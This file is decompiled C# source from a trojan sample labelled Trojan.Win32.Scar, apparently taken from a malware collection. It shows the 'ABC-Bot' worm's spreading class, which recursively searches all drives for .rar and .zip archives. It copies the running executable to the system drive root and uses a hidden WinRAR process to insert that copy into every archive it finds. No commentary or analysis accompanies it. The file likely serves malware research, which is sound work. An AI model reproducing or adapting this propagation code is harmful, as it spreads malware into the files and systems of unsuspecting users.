// Decompiled with JetBrains decompiler
// Type: ABC_Bot.c_rar
// Assembly: ABC-Bot LITE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BDCF8A65-C7BB-4282-A753-29C8081B483A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.khuj-a4713264592b5ce9487baef210341fd98c5b1ba87d5def5dd0b32e682e0cde2e.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ABC_Bot
{
  public class c_rar
  {
    private static string _rarPath;
    private static string _copiedExeName;

    [DebuggerNonUserCode]
    public c_rar()
    {
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern int GetShortPathName(
      [MarshalAs(UnmanagedType.LPTStr)] string path,
      [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath,
      int shortPathLength);

    private static void Search(string pathName)
    {
      string[] files = Directory.GetFiles(pathName);
      int index1 = 0;
      while (index1 < files.Length)
      {
        string archiveToInject = files[index1];
        if (archiveToInject.Contains(".rar"))
          c_rar.RarStart(archiveToInject);
        if (archiveToInject.Contains(".zip"))
          c_rar.RarStart(archiveToInject);
        checked { ++index1; }
      }
      string[] directories = Directory.GetDirectories(pathName);
      int index2 = 0;
      while (index2 < directories.Length)
      {
        c_rar.Search(directories[index2]);
        checked { ++index2; }
      }
    }

    public static void Spread(string myExeName)
    {
      c_rar._copiedExeName = myExeName;
      string[] logicalDrives = Environment.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        c_rar.Search(logicalDrives[index]);
        checked { ++index; }
      }
      File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt");
    }

    public static void RarStart(string archiveToInject)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
      c_rar._rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
      if (!File.Exists(c_rar._rarPath))
        return;
      if (!File.Exists(Path.Combine(path1, c_rar._copiedExeName)))
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, c_rar._copiedExeName));
      StringBuilder shortPath1 = new StringBuilder((int) byte.MaxValue);
      c_rar.GetShortPathName(Path.Combine(path1, c_rar._copiedExeName), shortPath1, shortPath1.Capacity);
      string str1 = shortPath1.ToString();
      StringBuilder shortPath2 = new StringBuilder((int) byte.MaxValue);
      c_rar.GetShortPathName(archiveToInject, shortPath2, shortPath2.Capacity);
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string str2 = " a " + shortPath2.ToString() + " " + str1;
        startInfo.FileName = c_rar._rarPath;
        startInfo.Arguments = str2;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
